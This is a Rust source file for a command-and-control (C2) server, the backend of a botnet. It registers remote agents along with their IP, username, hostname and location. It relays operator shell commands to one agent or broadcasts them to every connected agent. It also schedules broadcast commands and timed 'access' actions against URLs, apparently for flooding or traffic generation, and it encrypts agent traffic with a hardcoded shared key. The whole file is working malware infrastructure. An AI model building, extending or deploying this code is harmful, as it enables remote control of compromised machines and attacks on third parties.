use crate::handlers::models::{Agent, C2Message};
use chacha20poly1305::{
    AeadCore, XChaCha20Poly1305, XNonce,
    aead::{Aead, KeyInit, OsRng},
};
use chrono::{DateTime, Utc};
use futures::{SinkExt, StreamExt};
use serde_json::json;
use sqlx::{Pool, Postgres, Row};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::sync::mpsc;
use tokio::time;
use uuid::Uuid;
use warp::Filter;
use warp::ws::{Message, WebSocket};
use base64;

pub struct ServerState {
    pub agents: HashMap<String, mpsc::Sender<Message>>,
    pub clients: HashMap<String, mpsc::Sender<Message>>,
    pub db: Pool<Postgres>,
    pub server_key: [u8; 32],
    pub operator_keys: HashMap<String, [u8; 32]>,
    pub agent_uuid_map: HashMap<String, String>, // Maps connection UUID to agent UUID
}

impl ServerState {
    pub fn new(db: Pool<Postgres>) -> Self {
        let server_key = XChaCha20Poly1305::generate_key(&mut OsRng).into();
        ServerState {
            agents: HashMap::new(),
            clients: HashMap::new(),
            db,
            server_key,
            operator_keys: HashMap::new(),
            agent_uuid_map: HashMap::new(),
        }
    }
}

pub async fn start_server(db: Pool<Postgres>) {
    let state = Arc::new(Mutex::new(ServerState::new(db.clone())));
    let state_clone = Arc::clone(&state);
    let state_clone2 = Arc::clone(&state);
    let state_filter = warp::any().map(move || Arc::clone(&state_clone));

    // Load operator public keys and agent key
    {
        let db = db.clone();
        let mut state = state.lock().unwrap();
        // Load hardcoded agent key
        let agent_key = base64::decode("k3V9a2J4cXV4cXV5end1dHNlY3VyZWRrZXkxMjM0NTY=").expect("Failed to decode hardcoded agent key");
        let agent_key: [u8; 32] = agent_key.try_into().expect("Hardcoded agent key has invalid length");
        state.operator_keys.insert("agent".to_string(), agent_key);
        eprintln!("Loaded agent key into operator_keys");

        // Load operator keys from database
        let rows = sqlx::query(
            "SELECT operator_id, public_key FROM operator_tokens WHERE active = true",
        )
        .fetch_all(&db)
        .await
        .unwrap_or_default();
        for row in rows {
            let operator_id: String = row.get("operator_id");
            let public_key: Vec<u8> = row.get("public_key");
            if public_key.len() == 32 {
                let mut key = [0u8; 32];
                key.copy_from_slice(&public_key);
                state.operator_keys.insert(operator_id.clone(), key);
                eprintln!("Loaded operator key for {}", operator_id);
            } else {
                eprintln!("Invalid public key for operator_id: {}", operator_id);
            }
        }
    }

    // Background worker for scheduled tasks
    {
        tokio::spawn(async move {
            let mut interval = time::interval(Duration::from_secs(60));
            loop {
                interval.tick().await;
                let now = Utc::now();
                let db = state_clone2.lock().unwrap().db.clone();
                let tasks = sqlx::query(
                    "SELECT id, command_type, args FROM scheduled_tasks WHERE execute_at <= $1 AND executed = false"
                )
                .bind(now.to_string())
                .fetch_all(&db)
                .await
                .unwrap_or_default();

                for task in tasks {
                    let task_id: i32 = task.get("id");
                    let command_type: String = task.get("command_type");
                    let args: serde_json::Value = task.get("args");
                    match command_type.as_str() {
                        "broadcast" => {
                            if let Some(cmd) = args["cmd"].as_str() {
                                let senders = state_clone2
                                    .lock()
                                    .unwrap()
                                    .agents
                                    .values()
                                    .cloned()
                                    .collect::<Vec<_>>();
                                let msg = serde_json::to_string(&C2Message::Broadcast {
                                    cmd: cmd.to_string(),
                                })
                                .unwrap();
                                for sender in senders {
                                    let _ = sender.send(Message::text(msg.clone())).await;
                                }
                            }
                        }
                        "access" => {
                            if let (Some(url), Some(secs)) =
                                (args["url"].as_str(), args["duration_secs"].as_u64())
                            {
                                let access_cmd = json!({
                                    "action": "access",
                                    "url": url,
                                    "duration_secs": secs
                                })
                                .to_string();
                                let msg = serde_json::to_string(&C2Message::Broadcast {
                                    cmd: access_cmd,
                                })
                                .unwrap();
                                let senders = state_clone2
                                    .lock()
                                    .unwrap()
                                    .agents
                                    .values()
                                    .cloned()
                                    .collect::<Vec<_>>();
                                for sender in senders {
                                    let _ = sender.send(Message::text(msg.clone())).await;
                                }
                            }
                        }
                        _ => {}
                    }
                    sqlx::query("UPDATE scheduled_tasks SET executed = true WHERE id = $1")
                        .bind(task_id)
                        .execute(&db)
                        .await
                        .ok();
                }
            }
        });
    }

    let ws_route = warp::path("c2").and(warp::ws()).and(state_filter).map(
        |ws: warp::ws::Ws, state: Arc<Mutex<ServerState>>| {
            ws.on_upgrade(move |socket| handle_connection(socket, state))
        },
    );
    println!("Server running on ws://0.0.0.0:80/c2");
    warp::serve(ws_route).run(([0, 0, 0, 0], 80)).await;
}

async fn validate_token(
    db: &Pool<Postgres>,
    operator_id: &str,
    token: &str,
) -> Result<bool, sqlx::Error> {
    let result = sqlx::query("SELECT active FROM operator_tokens WHERE operator_id = $1 AND token = $2 AND (expires_at IS NULL OR expires_at > CURRENT_TIMESTAMP)")
        .bind(operator_id)
        .bind(token)
        .fetch_optional(db)
        .await?;
    Ok(result
        .map(|row| row.get::<bool, _>("active"))
        .unwrap_or(false))
}

async fn update_agent_status(
    state: &Arc<Mutex<ServerState>>,
    uuid: &str,
    online: bool,
) -> Result<(), sqlx::Error> {
    let db = state.lock().unwrap().db.clone();
    sqlx::query("UPDATE agents SET online = $1 WHERE uuid = $2")
        .bind(online)
        .bind(uuid)
        .execute(&db)
        .await?;
    Ok(())
}

async fn encrypt_message(
    state: &Arc<Mutex<ServerState>>,
    id: &str,
    message: &str,
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let state = state.lock().unwrap();
    let key = state
        .operator_keys
        .get(id)
        .ok_or(format!("Key not found for id: {}", id))?;
    let cipher = XChaCha20Poly1305::new(key.into());
    let nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);
    let mut ciphertext = cipher.encrypt(&nonce, message.as_bytes()).unwrap();
    let mut result = nonce.to_vec();
    result.append(&mut ciphertext);
    Ok(result)
}

async fn decrypt_message(
    state: &Arc<Mutex<ServerState>>,
    id: &str,
    data: &[u8],
) -> Result<String, Box<dyn std::error::Error>> {
    let state = state.lock().unwrap();
    let key = state
        .operator_keys
        .get(id)
        .ok_or(format!("Key not found for id: {}", id))?;
    if data.len() < 24 {
        return Err("Invalid message length".into());
    }
    let nonce = XNonce::from_slice(&data[..24]);
    let ciphertext = &data[24..];
    let cipher = XChaCha20Poly1305::new(key.into());
    eprintln!("Attempting decryption with key for id: {}", id);
    let plaintext = cipher.decrypt(nonce, ciphertext).map_err(|e| format!("Decryption error: {}", e))?;
    Ok(String::from_utf8(plaintext).map_err(|e| format!("UTF-8 conversion error: {}", e))?)
}

async fn handle_connection(ws: WebSocket, state: Arc<Mutex<ServerState>>) {
    let connection_uuid = Uuid::new_v4().to_string();
    let (mut ws_tx, mut ws_rx) = ws.split();
    let (tx, mut rx) = mpsc::channel::<Message>(100);
    {
        let mut state = state.lock().unwrap();
        state.clients.insert(connection_uuid.clone(), tx.clone());
    }

    tokio::spawn(async move {
        while let Some(msg) = rx.recv().await {
            let _ = ws_tx.send(msg).await;
        }
    });

    let mut authenticated = false;
    let mut operator_id = String::new();
    let mut is_agent = false;
    let mut operator_token = String::new();

    while let Some(result) = ws_rx.next().await {
        let msg = match result {
            Ok(msg) => msg,
            Err(_) => break,
        };

        let text = if let Ok(text) = msg.to_str() {
            text.to_string()
        } else if msg.is_binary() {
            let data = msg.into_bytes();
            if data.len() < 24 {
                eprintln!("Invalid message length from {}", connection_uuid);
                continue;
            }
            let id = if authenticated { &operator_id } else { "agent" };
            eprintln!("Processing binary message from {} with id: {}", connection_uuid, id);
            match decrypt_message(&state, id, &data).await {
                Ok(text) => {
                    if !authenticated && id == "agent" {
                        is_agent = true;
                        eprintln!("Marked connection {} as agent", connection_uuid);
                    }
                    eprintln!("Decrypted message from {}: {}", connection_uuid, text);
                    text
                }
                Err(e) => {
                    eprintln!("Decryption error from {}: {}", connection_uuid, e);
                    continue;
                }
            }
        } else {
            eprintln!("Non-text or non-binary message received from {}", connection_uuid);
            continue;
        };

        let c2_msg: C2Message = match serde_json::from_str(&text) {
            Ok(msg) => msg,
            Err(e) => {
                eprintln!("Error deserializing message from {}: {}", connection_uuid, e);
                continue;
            }
        };

        eprintln!("Received C2Message from {}: {:?}", connection_uuid, c2_msg);

        // Validate token for authenticated operator clients (skip for agents)
        if authenticated && !is_agent {
            let db = state.lock().unwrap().db.clone();
            match validate_token(&db, &operator_id, &operator_token).await {
                Ok(true) => {
                    // Token is valid, proceed with message processing
                }
                Ok(false) => {
                    eprintln!("Invalid or expired token for operator {} from connection {}", operator_id, connection_uuid);
                    let response = serde_json::to_string(&C2Message::AuthResponse {
                        success: false,
                        message: "Invalid or expired token".to_string(),
                    })
                    .unwrap();
                    let encrypted = encrypt_message(&state, &operator_id, &response)
                        .await
                        .unwrap_or_else(|e| {
                            eprintln!("Error encrypting AuthResponse for {}: {}", connection_uuid, e);
                            Message::text("").into_bytes()
                        });
                    let _ = tx.send(Message::binary(encrypted)).await;
                    let _ = tx.send(Message::close()).await;
                    break;
                }
                Err(e) => {
                    eprintln!("Error validating token for operator {}: {}", operator_id, e);
                    let response = serde_json::to_string(&C2Message::AuthResponse {
                        success: false,
                        message: format!("Token validation error: {}", e),
                    })
                    .unwrap();
                    let encrypted = encrypt_message(&state, &operator_id, &response)
                        .await
                        .unwrap_or_else(|e| {
                            eprintln!("Error encrypting AuthResponse for {}: {}", connection_uuid, e);
                            Message::text("").into_bytes()
                        });
                    let _ = tx.send(Message::binary(encrypted)).await;
                    let _ = tx.send(Message::close()).await;
                    break;
                }
            }
        }

        match c2_msg {
            C2Message::Authenticate {
                operator_id: op_id,
                token,
            } => {
                operator_id = op_id.clone();
                operator_token = token.clone();
                let db = state.lock().unwrap().db.clone();
                match validate_token(&db, &operator_id, &token).await {
                    Ok(true) => {
                        authenticated = true;
                        is_agent = false;
                        let response = serde_json::to_string(&C2Message::AuthResponse {
                            success: true,
                            message: "Authentication successful".to_string(),
                        })
                        .unwrap();
                        let encrypted = encrypt_message(&state, &operator_id, &response)
                            .await
                            .unwrap();
                        let _ = tx.send(Message::binary(encrypted)).await;
                    }
                    Ok(false) => {
                        let response = serde_json::to_string(&C2Message::AuthResponse {
                            success: false,
                            message: "Invalid or expired token".to_string(),
                        })
                        .unwrap();
                        let _ = tx.send(Message::text(response)).await;
                        let _ = tx.send(Message::close()).await;
                    }
                    Err(e) => {
                        let response = serde_json::to_string(&C2Message::AuthResponse {
                            success: false,
                            message: format!("Authentication error: {}", e),
                        })
                        .unwrap();
                        let _ = tx.send(Message::text(response)).await;
                        let _ = tx.send(Message::close()).await;
                    }
                }
            }
            C2Message::VersionCheck { uuid, agent_version } => {
                if !is_agent {
                    eprintln!("VersionCheck received from non-agent client {}", connection_uuid);
                    continue;
                }
                eprintln!("Processing VersionCheck from agent {} with version {}", uuid, agent_version);
                let response = serde_json::to_string(&C2Message::VersionResponse {
                    version: "1.0.1".to_string(),
                })
                .unwrap();
                let encrypted = encrypt_message(&state, "agent", &response)
                    .await
                    .unwrap_or_else(|e| {
                        eprintln!("Error encrypting VersionResponse for {}: {}", uuid, e);
                        Message::text("").into_bytes()
                    });
                let _ = tx.send(Message::binary(encrypted)).await;
            }
            C2Message::VersionCheckAck {} => {
                if !is_agent {
                    eprintln!("VersionCheckAck received from non-agent client {}", connection_uuid);
                    continue;
                }
                eprintln!("Received VersionCheckAck from {}", connection_uuid);
            }
            C2Message::Pong => {
                if !is_agent {
                    eprintln!("Pong received from non-agent client {}", connection_uuid);
                    continue;
                }
                let agent_uuid = state
                    .lock()
                    .unwrap()
                    .agent_uuid_map
                    .get(&connection_uuid)
                    .cloned()
                    .unwrap_or(connection_uuid.clone());
                update_agent_status(&state, &agent_uuid, true).await.ok();
                let response = serde_json::to_string(&C2Message::AgentStatus {
                    uuid: agent_uuid.clone(),
                    online: true,
                })
                .unwrap();
                let encrypted = encrypt_message(&state, "agent", &response)
                    .await
                    .unwrap_or_else(|e| {
                        eprintln!("Error encrypting message for {}: {}", agent_uuid, e);
                        Message::text("").into_bytes()
                    });
                let senders = state
                    .lock()
                    .unwrap()
                    .clients
                    .values()
                    .cloned()
                    .collect::<Vec<_>>();
                for sender in senders {
                    let _ = sender.send(Message::binary(encrypted.clone())).await;
                }
            }
            C2Message::AgentRegister {
                uuid,
                ip,
                username,
                hostname,
                country,
                city,
                region,
                latitude,
                longitude,
                version,
            } => {
                if !is_agent {
                    eprintln!("AgentRegister received from non-agent client {}", connection_uuid);
                    continue;
                }
                eprintln!("Registering agent {} with IP {} from connection {}", uuid, ip, connection_uuid);
                let db = state.lock().unwrap().db.clone();
                let result = sqlx::query(
                    "INSERT INTO agents (uuid, ip, username, hostname, country, city, region, latitude, longitude, version, online) 
                    VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, true) 
                    ON CONFLICT (uuid) DO UPDATE SET
                    ip = EXCLUDED.ip,
                    username = EXCLUDED.username,
                    hostname = EXCLUDED.hostname,
                    country = EXCLUDED.country,
                    city = EXCLUDED.city,
                    region = EXCLUDED.region,
                    latitude = EXCLUDED.latitude,
                    longitude = EXCLUDED.longitude,
                    version = EXCLUDED.version,
                    online = true
                    RETURNING ip"
                )
                .bind(&uuid)
                .bind(&ip)
                .bind(&username)
                .bind(&hostname)
                .bind(&country)
                .bind(&city)
                .bind(region)
                .bind(latitude)
                .bind(longitude)
                .bind(&version)
                .fetch_one(&db)
                .await;

                match result {
                    Ok(row) => {
                        let updated_ip: String = row.get("ip");
                        eprintln!("Agent {} IP updated in database to: {}", uuid, updated_ip);
                    }
                    Err(e) => {
                        eprintln!("Failed to update agent {} in database: {}", uuid, e);
                    }
                }

                let mut state = state.lock().unwrap();
                state.agents.insert(uuid.clone(), tx.clone());
                state.agent_uuid_map.insert(connection_uuid.clone(), uuid.clone());
            }
            C2Message::RequestAgentList => {
                if !authenticated {
                    eprintln!("RequestAgentList from unauthenticated client {}", connection_uuid);
                    continue;
                }
                let db = state.lock().unwrap().db.clone();
                let agents = sqlx::query_as::<_, Agent>("SELECT * FROM agents")
                    .fetch_all(&db)
                    .await
                    .unwrap_or_default();
                let response = serde_json::to_string(&C2Message::AgentList {
                    agents: agents.clone(),
                    total: agents.len(),
                    online: agents.iter().filter(|agent| agent.online).count(),
                })
                .unwrap();
                let encrypted = encrypt_message(&state, &operator_id, &response)
                    .await
                    .unwrap_or_else(|e| {
                        eprintln!("Error encrypting message for {}: {}", connection_uuid, e);
                        Message::text("").into_bytes()
                    });
                let _ = tx.send(Message::binary(encrypted)).await;
            }
            C2Message::RequestAgentDetails { identifier } => {
                if !authenticated {
                    eprintln!("RequestAgentDetails from unauthenticated client {}", connection_uuid);
                    continue;
                }
                let db = state.lock().unwrap().db.clone();
                let agent = if let Ok(id) = identifier.parse::<i32>() {
                    sqlx::query_as::<_, Agent>("SELECT * FROM agents WHERE id = $1")
                        .bind(id)
                        .fetch_optional(&db)
                        .await
                        .unwrap_or(None)
                } else {
                    sqlx::query_as::<_, Agent>("SELECT * FROM agents WHERE uuid = $1")
                        .bind(&identifier)
                        .fetch_optional(&db)
                        .await
                        .unwrap_or(None)
                };
                let response = serde_json::to_string(&C2Message::AgentDetails { agent }).unwrap();
                let encrypted = encrypt_message(&state, &operator_id, &response)
                    .await
                    .unwrap_or_else(|e| {
                        eprintln!("Error encrypting message for {}: {}", connection_uuid, e);
                        Message::text("").into_bytes()
                    });
                let _ = tx.send(Message::binary(encrypted)).await;
            }
            C2Message::Command { uuid, cmd } => {
                if !authenticated {
                    eprintln!("Command from unauthenticated client {}", connection_uuid);
                    continue;
                }
                if uuid == "server" {
                    let parts: Vec<&str> = cmd.splitn(3, ' ').collect();
                    if parts.len() >= 2 {
                        match parts[0] {
                            "generate-token" => {
                                if parts.len() == 3 {
                                    let op_id = parts[1];
                                    let token = parts[2];
                                    let db = state.lock().unwrap().db.clone();
                                    let operator_key = state
                                        .lock()
                                        .unwrap()
                                        .operator_keys
                                        .get(&operator_id)
                                        .cloned()
                                        .ok_or("Operator key not found")
                                        .unwrap();
                                    sqlx::query(
                                        "INSERT INTO operator_tokens (operator_id, token, public_key, active) VALUES ($1, $2, $3, true)"
                                    )
                                    .bind(op_id)
                                    .bind(token)
                                    .bind(operator_key.to_vec())
                                    .execute(&db)
                                    .await
                                    .ok();
                                    let response =
                                        serde_json::to_string(&C2Message::AuthResponse {
                                            success: true,
                                            message: format!(
                                                "Token generated for {}: {}",
                                                op_id, token
                                            ),
                                        })
                                        .unwrap();
                                    let encrypted =
                                        encrypt_message(&state, &operator_id, &response)
                                            .await
                                            .unwrap_or_else(|e| {
                                                eprintln!(
                                                    "Error encrypting message for {}: {}",
                                                    connection_uuid, e
                                                );
                                                Message::text("").into_bytes()
                                            });
                                    let _ = tx.send(Message::binary(encrypted)).await;
                                }
                            }
                            "revoke-token" => {
                                if parts.len() == 2 {
                                    let token = parts[1];
                                    let db = state.lock().unwrap().db.clone();
                                    sqlx::query("UPDATE operator_tokens SET active = false WHERE token = $1")
                                        .bind(token)
                                        .execute(&db)
                                        .await
                                        .ok();
                                    let response =
                                        serde_json::to_string(&C2Message::AuthResponse {
                                            success: true,
                                            message: format!("Token revoked: {}", token),
                                        })
                                        .unwrap();
                                    let encrypted =
                                        encrypt_message(&state, &operator_id, &response)
                                            .await
                                            .unwrap_or_else(|e| {
                                                eprintln!(
                                                    "Error encrypting message for {}: {}",
                                                    connection_uuid, e
                                                );
                                                Message::text("").into_bytes()
                                            });
                                    let _ = tx.send(Message::binary(encrypted)).await;
                                }
                            }
                            "schedule" => {
                                if parts.len() == 3 {
                                    let subcommand = parts[1];
                                    let args = parts[2];
                                    if let Ok(execute_at) = DateTime::parse_from_rfc3339(
                                        args.split('"').nth(1).unwrap_or(""),
                                    ) {
                                        let execute_at = execute_at.with_timezone(&Utc);
                                        let args_json: serde_json::Value = serde_json::from_str(
                                            args.split('"').nth(3).unwrap_or("{}"),
                                        )
                                        .unwrap_or(json!({}));
                                        let db = state.lock().unwrap().db.clone();
                                        sqlx::query(
                                            "INSERT INTO scheduled_tasks (command_type, args, execute_at) VALUES ($1, $2, $3)"
                                        )
                                        .bind(subcommand)
                                        .bind(&args_json)
                                        .bind(execute_at.to_string())
                                        .execute(&db)
                                        .await
                                        .ok();
                                    }
                                }
                            }
                            _ => {}
                        }
                    }
                } else {
                    let agent_sender = state.lock().unwrap().agents.get(&uuid).cloned();
                    if let Some(agent_sender) = agent_sender {
                        let command_msg =
                            serde_json::to_string(&C2Message::Command { uuid: uuid.clone(), cmd }).unwrap();
                        let encrypted = encrypt_message(&state, "agent", &command_msg)
                            .await
                            .unwrap_or_else(|e| {
                                eprintln!("Error encrypting message for {}: {}", uuid, e);
                                Message::text("").into_bytes()
                            });
                        let _ = agent_sender.send(Message::binary(encrypted)).await;
                    }
                }
            }
            C2Message::Broadcast { cmd } => {
                if !authenticated {
                    eprintln!("Broadcast from unauthenticated client {}", connection_uuid);
                    continue;
                }
                let senders = state
                    .lock()
                    .unwrap()
                    .agents
                    .values()
                    .cloned()
                    .collect::<Vec<_>>();
                let broadcast_msg = serde_json::to_string(&C2Message::Broadcast { cmd }).unwrap();
                let encrypted = encrypt_message(&state, "agent", &broadcast_msg)
                    .await
                    .unwrap_or_else(|e| {
                        eprintln!("Error encrypting message for {}: {}", connection_uuid, e);
                        Message::text("").into_bytes()
                    });
                for sender in senders {
                    let _ = sender.send(Message::binary(encrypted.clone())).await;
                }
            }
            C2Message::CommandResponse { output } => {
                if !is_agent {
                    eprintln!("CommandResponse from non-agent client {}", connection_uuid);
                    continue;
                }
                let agent_uuid = state
                    .lock()
                    .unwrap()
                    .agent_uuid_map
                    .get(&connection_uuid)
                    .cloned()
                    .unwrap_or(connection_uuid.clone());
                let senders = state
                    .lock()
                    .unwrap()
                    .clients
                    .values()
                    .cloned()
                    .collect::<Vec<_>>();
                let response_msg =
                    serde_json::to_string(&C2Message::CommandResponse { output }).unwrap();
                for sender in senders {
                    let encrypted = encrypt_message(&state, "agent", &response_msg)
                        .await
                        .unwrap_or_else(|e| {
                            eprintln!("Error encrypting message for {}: {}", agent_uuid, e);
                            Message::text("").into_bytes()
                        });
                    let _ = sender.send(Message::binary(encrypted.clone())).await;
                }
            }
            _ => {}
        }
    }

    eprintln!("Connection {} disconnected", connection_uuid);
    let agent_uuid = {
        let mut state = state.lock().unwrap();
        state.clients.remove(&connection_uuid);
        state.agent_uuid_map.remove(&connection_uuid).map(|uuid| {
            state.agents.remove(&uuid);
            uuid
        })
    };
    if let Some(agent_uuid) = agent_uuid {
        update_agent_status(&state, &agent_uuid, false).await.ok();
    }
}